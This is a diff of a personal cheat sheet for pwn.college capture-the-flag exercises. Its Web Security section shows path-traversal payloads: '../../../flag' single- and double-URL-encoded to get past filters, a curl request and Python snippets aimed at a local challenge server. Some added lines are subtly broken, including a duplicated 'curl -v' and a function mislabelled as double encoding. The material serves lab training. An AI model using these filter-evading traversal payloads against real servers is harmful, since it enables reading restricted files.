@@ -2,6 +2,10 @@ title: pwn.college
 url:   https://pwn.college/
 tags:  pwn pwncollege ctf linux shell bash rtfm docs manual
 
+; ===============  General
+; 1. Don't brute force, UNDERSTAND the code in front of you better than the developer who wrote it.
+
+
 ; ===============  linux
 ## rtfm man pages
 ; RTFM means "read the manual". Every Linux command and function has a man page.
@@ -83,31 +87,22 @@ $(< "$FILE")
 
 
 ; ===============  Web Security
-; ===============    (Aka intro to command injection - html injection - sql injection )
 
-; When Its GET request I like to use google!
-; ../../../flag
-https://www.google.com/search?q=..%2F..%2F..%2Fflag
-; to trick the server for reading the secret file
-
-; Encoding "../../flag" --to--> "..%2F..%2F..%2Fflag" WITH Python
+; ===============    GET URL injection
 ;
-; Encoding ../ as %2e%2e%2f gets it past curl and past filters that look for ../.
-; Python's urllib.parse.quote never encodes "." (it is unreserved), so do it by hand.
-enc(s)                                     # url-encode every byte of a string in python, dots too  @percent-encoding @urlencode @quote @dot-dot-slash  <https://docs.python.org/3/library/urllib.parse.html#urllib.parse.quote>
-    def enc(s):
-        return "".join(f"%{b:02x}" for b in s.encode())
-    single = enc("../../../flag")   # %2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67
-    double = enc(single)            # %25%32%65%25%32%65...
+; When its GET request I like to use google!
+; to convet string for GET URL; ex: "../../../flag"
+; https://www.google.com/search?q=..%2F..%2F..%2Fflag
+$ curl -v curl -v http://challenge.localhost:80/..%252F..%252F..%252Fflag
 
-p.replace(".", "%2e").replace("/", "%2f")  # single-encode only ../ in python, keep the file name readable  @path-traversal @urlencode
-    p = "../../../flag"
-    single = p.replace(".", "%2e").replace("/", "%2f")   # %2e%2e%2f%2e%2e%2f%2e%2e%2fflag
+; ===  WITH Python:
+;
+; url-encode string for a GET path; like Google URLs
+from urllib.parse import quote
+quote("../../../flag", safe="")                  # ..%2F..%2F..%2Fflag
 
-single.replace("%", "%25")                 # double-encode an already encoded path in python  @path-traversal @double-encoding
-    double = single.replace("%", "%25")                  # %252e%252e%252f%252e%252e%252fflag
+; double encodes
+def urlenc(s: str) -> str:
+      return "%" + s.encode().hex("%")
 
-requests.get(URL)                          # send an encoded path from python, requests keeps %2e as is  @http @get @path-traversal  <https://requests.readthedocs.io/en/latest/user/quickstart/>
-    import requests
-    r = requests.get(f"http://challenge.localhost/payload/{single}")
-    print(r.status_code, r.text)
+print(urlenc("../../../flag"))     # %2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67
